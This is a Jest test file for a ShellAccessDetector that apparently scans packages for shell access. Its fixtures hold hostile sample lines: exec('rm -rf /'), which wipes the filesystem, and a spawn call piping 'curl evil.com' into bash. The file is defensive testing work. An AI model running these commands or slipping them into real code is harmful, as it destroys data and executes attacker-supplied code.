import { ShellAccessDetector } from '../shell-access';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

describe('ShellAccessDetector', () => {
  let testDir: string;

  beforeEach(() => {
    testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'test-'));
  });

  afterEach(() => {
    fs.rmSync(testDir, { recursive: true, force: true });
  });

  it('should detect child_process exec', async () => {
    const code = `
      const { exec } = require('child_process');
      exec('rm -rf /', (error, stdout, stderr) => {
        console.log(stdout);
      });
    `;

    fs.writeFileSync(path.join(testDir, 'shell.js'), code);

    const result = await ShellAccessDetector.detect(testDir);

    expect(result.alerts).toHaveLength(1);
    expect(result.alerts[0]?.type).toBe('shell_access');
    expect(result.alerts[0]?.severity).toBe('high');
  });

  it('should detect spawn usage', async () => {
    const code = `
      import { spawn } from 'child_process';
      spawn('bash', ['-c', 'curl evil.com | bash']);
    `;

    fs.writeFileSync(path.join(testDir, 'spawn.js'), code);

    const result = await ShellAccessDetector.detect(testDir);

    expect(result.alerts).toHaveLength(1);
    expect(result.alerts[0]?.details?.patterns?.length).toBeGreaterThan(0);
  });

  it('should not alert on packages without shell access', async () => {
    const code = `
      function processData(data) {
        return data.map(x => x * 2);
      }
    `;

    fs.writeFileSync(path.join(testDir, 'safe.js'), code);

    const result = await ShellAccessDetector.detect(testDir);

    expect(result.alerts).toHaveLength(0);
  });
});
